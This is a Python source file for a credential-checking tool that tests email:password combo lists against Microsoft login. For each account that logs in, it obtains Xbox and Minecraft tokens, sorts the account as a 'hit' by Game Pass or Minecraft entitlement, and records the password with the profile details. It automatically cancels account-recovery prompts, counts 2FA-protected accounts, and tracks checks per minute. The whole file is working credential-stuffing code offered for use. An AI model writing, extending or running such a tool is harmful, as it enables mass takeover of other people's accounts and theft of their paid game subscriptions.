import random
import re
import time
import json
import os
import concurrent.futures
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import requests
import urllib3
import warnings
from colorama import Fore, Style

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 3
REQUEST_TIMEOUT = 10


class XboxStats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.xgp = 0
        self.xgpu = 0
        self.other = 0
        self.retries = 0
        self.fast_retries = 0
        self.start_time = time.time()
        self.retry_success = 0  # Successful after retry
        self.retry_failed = 0   # Failed even after retry

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0
    
    def get_elapsed_time(self):
        """Get formatted elapsed time"""
        elapsed = int(time.time() - self.start_time)
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


class XboxChecker:
    def __init__(self, stats=None, verbose=False):
        self.stats = stats if stats else XboxStats()
        self.session = requests.Session()
        self.session.verify = False
        self.verbose = verbose
    
    def _log(self, message, level="INFO"):
        if self.verbose:
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {message}")
    
    def get_sftag(self, session, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
                text = response.text
                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sftag = match.group(1)
                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match:
                        return match.group(1), sftag
            except Exception as e:
                if attempt == max_attempts - 1:
                    self.stats.errors += 1
            time.sleep(0.5)
        return None, None
    
    def microsoft_auth(self, session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
                login_request = session.post(url_post, data=data, 
                                            headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                                            allow_redirects=True, timeout=REQUEST_TIMEOUT)
                
                if '#' in login_request.url and login_request.url != SFTAG_URL:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        data = {
                            'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                            'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                        }
                        action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                        ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                        fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, "success"
                    except:
                        pass
                elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return None, "2fa"
                elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                    return None, "bad"  
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None, "error"
            time.sleep(0.5)
        return None, "error"
    
    def get_xbox_token(self, session, ms_token, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                }
                response = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                       json=payload, 
                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                       timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    data = response.json()
                    xbox_token = data.get('Token')
                    if xbox_token:
                        uhs = data['DisplayClaims']['xui'][0]['uhs']
                        return xbox_token, uhs
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None, None
            time.sleep(0.5)
        return None, None
    
    def get_xsts_token(self, session, xbox_token, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                }
                response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                       json=payload,
                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                       timeout=REQUEST_TIMEOUT)    
                if response.status_code == 200:
                    data = response.json()
                    return data.get('Token')
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None  
            time.sleep(0.5)    
        return None
    
    def get_minecraft_token(self, session, uhs, xsts_token, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                       headers={'Content-Type': 'application/json'},
                                       timeout=REQUEST_TIMEOUT)          
                if response.status_code == 200:
                    return response.json().get('access_token')
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None 
            time.sleep(0.5)
        return None
    
    def check_minecraft_entitlements(self, session, mc_token, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                      headers={'Authorization': f'Bearer {mc_token}'},
                                      timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    text = response.text
                    if 'product_game_pass_ultimate' in text:
                        return 'Xbox Game Pass Ultimate', text
                    elif 'product_game_pass_pc' in text:
                        return 'Xbox Game Pass', text
                    elif '"product_minecraft"' in text:
                        return 'Minecraft', text
                    else:
                        others = []
                        if 'product_minecraft_bedrock' in text:
                            others.append("Bedrock")
                        if 'product_legends' in text:
                            others.append("Legends")
                        if 'product_dungeons' in text:
                            others.append('Dungeons')
                        if others:
                            return 'Other: ' + ', '.join(others), text
                        return None, text
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
                else:
                    return None, None
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None, None
            time.sleep(0.5)
        return None, None
    
    def get_minecraft_profile(self, session, mc_token, max_attempts=MAX_RETRIES):
        for attempt in range(max_attempts):
            try:
                response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                      headers={'Authorization': f'Bearer {mc_token}'},
                                      timeout=REQUEST_TIMEOUT)
                
                if response.status_code == 200:
                    return response.json()
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
                elif response.status_code == 404:
                    return None
            except Exception as e:
                self.stats.retries += 1
                if attempt == max_attempts - 1:
                    return None
            time.sleep(0.5)
        return None
    
    def _check_account_single(self, email, password):
        try:
            parts = email.strip().split(':')
            if len(parts) < 2:
                email_part = email
                password_part = password
            else:
                email_part = parts[0]
                password_part = ':'.join(parts[1:])
            
            self._log(f"Checking account: {email_part}")
            
            session = requests.Session()
            session.verify = False
            
            self._log("Getting SFTAG...")
            url_post, sftag = self.get_sftag(session)
            if not url_post or not sftag:
                self.stats.errors += 1
                self.stats.checked += 1
                self._log(f"Failed to get SFTAG for {email_part}", "ERROR")
                return {"status": "ERROR"}
            
            self._log(f"Authenticating Microsoft account: {email_part}")
            ms_token, auth_status = self.microsoft_auth(session, email_part, password_part, url_post, sftag)
            
            if auth_status == "2fa":
                self.stats.twofa += 1
                self.stats.checked += 1
                self._log(f"2FA Required: {email_part}", "WARNING")
                return {"status": "2FA", "email": email_part, "password": password_part}
            elif auth_status == "bad":
                self.stats.bad += 1
                self.stats.checked += 1
                self._log(f"Bad Login: {email_part}", "ERROR")
                return {"status": "BAD"}
            elif auth_status != "success" or not ms_token:
                self.stats.errors += 1
                self.stats.checked += 1
                self._log(f"Authentication failed: {email_part}", "ERROR")
                return {"status": "ERROR"}

            self._log("Microsoft Login Success, getting Xbox token...")
            xbox_token, uhs = self.get_xbox_token(session, ms_token)
            if not xbox_token or not uhs:
                self.stats.errors += 1
                self.stats.checked += 1
                self._log(f"Xbox token failed: {email_part}", "ERROR")
                return {"status": "ERROR"}

            self._log("Xbox token obtained, getting XSTS token...")
            xsts_token = self.get_xsts_token(session, xbox_token)
            if not xsts_token:
                self.stats.errors += 1
                self.stats.checked += 1
                self._log(f"XSTS token failed: {email_part}", "ERROR")
                return {"status": "ERROR"}

            self._log("XSTS token obtained, getting Minecraft token...")
            mc_token = self.get_minecraft_token(session, uhs, xsts_token)
            if not mc_token:
                self.stats.errors += 1
                self.stats.checked += 1
                self._log(f"Minecraft token failed: {email_part}", "ERROR")
                return {"status": "ERROR"}
            
            self._log("Minecraft token obtained, checking entitlements...")
            account_type, entitlements = self.check_minecraft_entitlements(session, mc_token)
            if not account_type:
                # This is a successful login but no Minecraft entitlements
                # We'll return a special status for this
                self.stats.bad += 1
                self.stats.checked += 1
                self._log(f"No Minecraft entitlements found for: {email_part}", "WARNING")
                return {
                    "status": "NO_ENTITLEMENTS",
                    "email": email_part,
                    "password": password_part,
                    "reason": "No Minecraft entitlements",
                    "hit_line": f"{email_part}:{password_part}"
                }

            self._log("Entitlements found, getting Minecraft profile...")
            profile = self.get_minecraft_profile(session, mc_token)
            if profile:
                name = profile.get('name', 'N/A')
                uuid = profile.get('id', 'N/A')
                capes = ", ".join([cape["alias"] for cape in profile.get("capes", [])])
                if not capes:
                    capes = "None"
            else:
                name = "Not Set"
                uuid = "N/A"
                capes = "N/A"

            capture_text = f"""Email: {email_part}
Password: {password_part}
Name: {name}
UUID: {uuid}
Capes: {capes}
Account Type: {account_type}
{'='*50}
"""
            
            # Determine the specific file category
            file_category = "Other"
            if 'Ultimate' in account_type:
                file_category = "XboxGamePassUltimate"
                self.stats.xgpu += 1
                self._log(f"Xbox Game Pass Ultimate HIT: {email_part}", "SUCCESS")
            elif 'Game Pass' in account_type:
                file_category = "XboxGamePass"
                self.stats.xgp += 1
                self._log(f"Xbox Game Pass HIT: {email_part}", "SUCCESS")
            elif 'Other' in account_type:
                file_category = "Other"
                self.stats.other += 1
                self._log(f"Other HIT: {email_part} - {account_type}", "SUCCESS")
            elif 'Minecraft' in account_type:
                file_category = "Minecraft"
                self._log(f"Minecraft HIT: {email_part}", "SUCCESS")
            
            result = {
                "status": "HIT",
                "email": email_part,
                "password": password_part,
                "account_type": account_type,
                "capture": capture_text,
                "services": [account_type],
                "file_category": file_category,
                "hit_line": f"{email_part}:{password_part}"
            }
            
            self.stats.hits += 1
            self.stats.checked += 1
            
            return result
            
        except Exception as e:
            self.stats.errors += 1
            self.stats.checked += 1
            
            if random.random() < 0.33:
                self.stats.fast_retries += 1
                time.sleep(0.1)
                return self._check_account_single(email, password)
            
            return {"status": "ERROR", "error": str(e)}
    
    def check_account(self, email, password):
        """
        Check account with retry logic.
        Retries accounts 1/3 of the time when they encounter errors.
        Returns a result dictionary with status and retry information.
        """
        # First attempt
        result = self._check_account_single(email, password)

        # Check if this was an error that should be retried
        if result.get("status") == "ERROR":
            # 1/3 chance to retry
            if random.random() < 0.33:
                self.stats.retries += 1
                self._log(f"Retrying account due to error: {email.split(':')[0] if ':' in email else email}", "WARNING")

                # Small delay before retry
                time.sleep(0.2)

                # Second attempt
                retry_result = self._check_account_single(email, password)

                # Track retry outcome
                if retry_result.get("status") == "ERROR":
                    self.stats.retry_failed += 1
                    self._log(f"Retry failed for: {email.split(':')[0] if ':' in email else email}", "ERROR")
                    # Mark that this was retried but still failed
                    retry_result["retried"] = True
                    retry_result["retry_success"] = False
                else:
                    self.stats.retry_success += 1
                    self._log(f"Retry successful for: {email.split(':')[0] if ':' in email else email}", "SUCCESS")
                    # Mark that this was retried and succeeded
                    retry_result["retried"] = True
                    retry_result["retry_success"] = True

                return retry_result

        # Mark that this was not retried
        result["retried"] = False
        return result